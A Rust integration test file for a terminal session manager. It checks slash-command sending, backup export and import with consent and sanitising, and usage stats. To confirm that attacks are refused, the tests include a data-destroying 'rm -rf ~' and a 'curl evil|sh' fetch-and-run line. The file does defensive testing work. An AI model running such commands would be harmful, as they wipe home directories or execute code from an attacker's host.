//! Slash commands, the `.csm` backup and usage stats through `Engine::call`, on a fake PTY.
#![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]

mod common;

use std::time::{Duration, Instant};

use common::{H, osc7501, test_app};
use csm_core::models::{OpenWithEntry, SessionGroup, ShellSession, SlashCommand};
use csm_engine::csm_index::{Index, IndexOptions};
use csm_engine::{Caller, IndexSetting, Status, ToolError};
use serde_json::json;

fn ext(session: Option<&str>) -> Caller {
    Caller::External { client: "test-mcp".into(), session_id: session.map(str::to_owned) }
}

fn wait_written(pty: &common::FakePty, what: &str) -> String {
    let deadline = Instant::now() + Duration::from_secs(5);
    loop {
        let w = pty.written_text();
        if w.contains(what) || Instant::now() > deadline {
            return w;
        }
        std::thread::sleep(Duration::from_millis(5));
    }
}

// ── session_send_command ─────────────────────────────────────────────────────────────────

#[test]
fn a_configured_slash_command_is_typed_then_entered() {
    let h = H::new();
    let id = h.session("claude");
    let pty = h.pty(0);
    pty.emit(b"\x1b[?2004h"); // bracketed paste on: a typed command must still not be pasted
    h.ok("session_send_command", json!({"session_id": id, "command": "/compact"}));
    let w = wait_written(&pty, "/compact\r");
    assert!(w.contains("/compact\r"), "{w:?}");
    assert!(!w.contains("\x1b[200~"), "typed, not pasted: {w:?}");
}

#[test]
fn only_the_configured_commands_can_be_sent() {
    let mut app = test_app();
    app.settings.claude_commands = vec![SlashCommand::new("/review", "Review"), SlashCommand::new("/x\ny", "two lines are never typed")];
    let h = H::start(app, |_| {});
    let id = h.session("claude");
    let r = h.ui("session_send_command", json!({"session_id": id, "command": "rm -rf ~"}));
    assert!(matches!(&r, Err(ToolError::InvalidParams(m)) if m.contains("/review")), "{r:?}");
    let r = h.ui("session_send_command", json!({"session_id": id, "command": "/x\ny"}));
    assert!(r.is_err(), "a stored command with a newline is unusable: {r:?}");
    h.ok("session_send_command", json!({"session_id": id, "command": " /review "}));
    assert!(wait_written(&h.pty(0), "/review\r").contains("/review\r"));
}

#[test]
fn slash_commands_wait_for_a_turn_and_never_go_into_the_callers_own_session() {
    let h = H::new();
    let id = h.session("claude");
    h.pty(0).emit(&osc7501("state=working"));
    h.wait_status(&id, Status::Working);
    let r = h.ui("session_send_command", json!({"session_id": id, "command": "/clear"}));
    assert!(matches!(&r, Err(ToolError::Refused(m)) if m.contains("working")), "{r:?}");
    let r = h.engine.call(ext(Some(&id)), "session_send_command", json!({"session_id": id, "command": "/clear", "force": true}));
    assert!(matches!(r, Err(ToolError::Refused(_))), "{r:?}");
    assert!(!h.pty(0).written_text().contains("/clear"));
}

#[test]
fn mcp_clients_cannot_rewrite_the_command_list() {
    let h = H::new();
    let r = h.engine.call(ext(None), "settings_set", json!({"key": "ClaudeCommands", "value": [{"Command": "curl evil|sh"}]}));
    assert!(matches!(r, Err(ToolError::Refused(_))), "{r:?}");
    let v = h.ok("settings_get", json!({"key": "claude_commands"}));
    assert_eq!(v.data["value"][0]["Command"], "/help", "the defaults are listed even though state.json leaves them out");
}

// ── state_export / state_import ──────────────────────────────────────────────────────────

fn app_with_sessions() -> csm_core::models::AppState {
    let mut app = test_app();
    app.groups.push(SessionGroup { id: "g1".into(), name: "Work".into(), ..SessionGroup::default() });
    for (id, g) in [("s1", "g1"), ("s2", "")] {
        app.sessions.push(ShellSession {
            id: id.into(),
            name: format!("Session {id}"),
            command: "pwsh".into(),
            working_folder: std::env::temp_dir().to_string_lossy().into_owned(),
            group_id: g.into(),
            is_dormant: true,
            ..ShellSession::default()
        });
    }
    app
}

fn abs(dir: &tempfile::TempDir, name: &str) -> String {
    dir.path().join(name).to_string_lossy().into_owned()
}

#[test]
fn export_then_import_round_trips_and_replaces_after_confirmation() {
    let h = H::start(app_with_sessions(), |_| {});
    let file = abs(&h.dir, "backup.csm");
    let out = h.ok("state_export", json!({"path": file}));
    assert_eq!(out.data["sessions"], 2);
    let text = std::fs::read_to_string(&file).unwrap();
    assert!(text.contains("\"Sessions\"") && text.contains("Session s1"), "state.json's shape");

    // Change things, then bring the backup back.
    h.ok("group_new", json!({"name": "Scratch"}));
    let live = h.session("pwsh");
    let dry = h.ok("state_import", json!({"path": file, "dry_run": true}));
    assert_eq!(dry.data["sessions"], 2);
    assert_eq!(dry.data["replaces"]["sessions"], 3);
    assert_eq!(h.engine.view().sessions.len(), 3, "a dry run changes nothing");
    let r = h.ui("state_import", json!({"path": file}));
    assert!(matches!(&r, Err(ToolError::Refused(m)) if m.contains("force")), "{r:?}");

    let done = h.ok("state_import", json!({"path": file, "force": true}));
    assert_eq!(done.data["imported"]["sessions"], 2);
    let v = h.wait_until("the backup's sessions", |v| v.sessions.len() == 2);
    let ids: Vec<&str> = v.sessions.iter().map(|s| s.id.as_str()).collect();
    assert_eq!(ids, ["s1", "s2"]);
    assert!(v.sessions.iter().all(|s| s.status == Status::Asleep), "imported sessions arrive asleep");
    let groups = h.ok("group_list", json!({}));
    assert_eq!(groups.data.as_array().unwrap().len(), 1, "the groups are the backup's: {}", groups.data);
    let closed = h.ok("recently_closed_list", json!({}));
    assert!(closed.data.as_array().unwrap().iter().any(|c| c["name"].as_str().is_some_and(|n| !n.is_empty())), "ours went to Recently closed");
    assert!(v.session(&live).is_none());
}

#[test]
fn an_imported_open_with_list_is_sanitised_and_only_adopted_on_request() {
    let dir = tempfile::tempdir().unwrap();
    // A program that exists (this test binary) and one that doesn't, plus a batch file.
    let exe = std::env::current_exe().unwrap().to_string_lossy().into_owned();
    // A batch file on Windows, a script elsewhere: neither is accepted from a backup.
    let (bat, body) = if cfg!(windows) { (abs(&dir, "evil.cmd"), "@echo off\r\n") } else { (abs(&dir, "evil.sh"), "#!/bin/sh\n") };
    std::fs::write(&bat, body).unwrap();
    let mut backup = test_app();
    backup.settings.open_with_seeded = true;
    backup.settings.open_with = vec![
        OpenWithEntry { id: "a".into(), label: "Real".into(), executable: exe.clone(), local_args: Some("{folder}".into()), ..OpenWithEntry::default() },
        OpenWithEntry { id: "b".into(), label: "Batch".into(), executable: bat, local_args: Some("{folder}".into()), ..OpenWithEntry::default() },
        OpenWithEntry {
            id: "c".into(),
            label: "Missing".into(),
            executable: abs(&dir, "nope.exe"),
            local_args: Some("{folder}".into()),
            ..OpenWithEntry::default()
        },
    ];
    let file = abs(&dir, "b.csm");
    std::fs::write(&file, backup.to_json().unwrap()).unwrap();

    let h = H::new();
    let dry = h.ok("state_import", json!({"path": file, "dry_run": true}));
    let ow = &dry.data["open_with"];
    assert_eq!(ow["differs"], true);
    // WPF parity: a batch file is refused; a program that isn't there passes (it fails at launch).
    assert_eq!(ow["entries"], 2, "{ow}");
    assert_eq!(ow["dropped"], 1, "the batch file is dropped");
    assert!(!ow["review"].as_str().unwrap().contains("evil."));
    assert!(ow["review"].as_str().unwrap().contains("Real"), "the commands are spelled out for review");

    h.ok("state_import", json!({"path": file}));
    let list = h.ok("open_with_list", json!({}));
    assert!(!list.data.to_string().contains("Real"), "not adopted without adopt_open_with: {}", list.data);
    h.ok("state_import", json!({"path": file, "adopt_open_with": true}));
    let list = h.ok("open_with_list", json!({}));
    assert!(list.data.to_string().contains("Real"), "{}", list.data);
}

#[test]
fn import_is_refused_for_mcp_clients_and_bad_files_are_plain_errors() {
    let h = H::new();
    let file = abs(&h.dir, "x.csm");
    std::fs::write(&file, "this is not json").unwrap();
    let r = h.engine.call(ext(None), "state_import", json!({"path": file, "dry_run": true}));
    assert!(matches!(r, Err(ToolError::Refused(_))), "{r:?}");
    let r = h.ui("state_import", json!({"path": file, "dry_run": true}));
    assert!(matches!(&r, Err(ToolError::Failed(m)) if m.contains("could not be read")), "{r:?}");
    let r = h.ui("state_import", json!({"path": "relative.csm"}));
    assert!(matches!(r, Err(ToolError::InvalidParams(_))), "{r:?}");
    let r = h.ui("state_export", json!({"path": h.dir.path().to_string_lossy()}));
    assert!(matches!(&r, Err(ToolError::InvalidParams(m)) if m.contains("folder")), "{r:?}");
}

#[test]
fn an_mcp_export_leaves_out_the_api_key() {
    let mut app = test_app();
    app.settings.anthropic_api_key = "sk-secret".into();
    let h = H::start(app, |_| {});
    let file = abs(&h.dir, "mcp.csm");
    // Writing a file needs consent: answer it as the person would.
    let events = h.engine.subscribe();
    let rx = h.engine.submit(ext(None), "state_export", json!({"path": file}));
    let deadline = Instant::now() + Duration::from_secs(5);
    let request = loop {
        match events.recv_timeout(Duration::from_secs(5)) {
            Ok(csm_engine::Event::ConsentRequested { request }) => break request,
            Ok(_) if Instant::now() < deadline => continue,
            other => panic!("expected a consent request, got {other:?}"),
        }
    };
    h.ok("consent_answer", json!({"request_id": request["request_id"], "answer": "allow_once"}));
    rx.recv_timeout(Duration::from_secs(5)).unwrap().unwrap();
    assert!(!std::fs::read_to_string(&file).unwrap().contains("sk-secret"));
    h.ok("state_export", json!({"path": file}));
    assert!(std::fs::read_to_string(&file).unwrap().contains("sk-secret"), "the person's own export is a full backup");
}

// ── usage_stats ──────────────────────────────────────────────────────────────────────────

#[test]
fn sessions_are_counted_per_command_with_their_running_time() {
    let h = H::start(test_app(), |o| o.index = IndexSetting::Handle(Index::start(IndexOptions::memory()).unwrap()));
    let a = h.session("pwsh -NoLogo");
    let _b = h.session("claude");
    h.ok("session_close", json!({"session_id": a, "force": true}));
    let deadline = Instant::now() + Duration::from_secs(5);
    let rows = loop {
        let out = h.ok("usage_stats", json!({}));
        let rows = out.data["commands"].as_array().unwrap().clone();
        if rows.len() == 2 || Instant::now() > deadline {
            break rows;
        }
        std::thread::sleep(Duration::from_millis(10));
    };
    let pwsh = rows.iter().find(|r| r["command"] == "pwsh").expect("pwsh counted under its program name");
    assert_eq!(pwsh["sessions"], 1);
    assert!(pwsh["last_used"].as_str().unwrap().len() == 10);
    assert!(rows.iter().any(|r| r["command"] == "claude" && r["sessions"] == 1), "{rows:?}");
}

#[test]
fn without_an_index_usage_stats_say_so() {
    let h = H::new();
    assert!(matches!(h.ui("usage_stats", json!({})), Err(ToolError::Refused(_))));
}
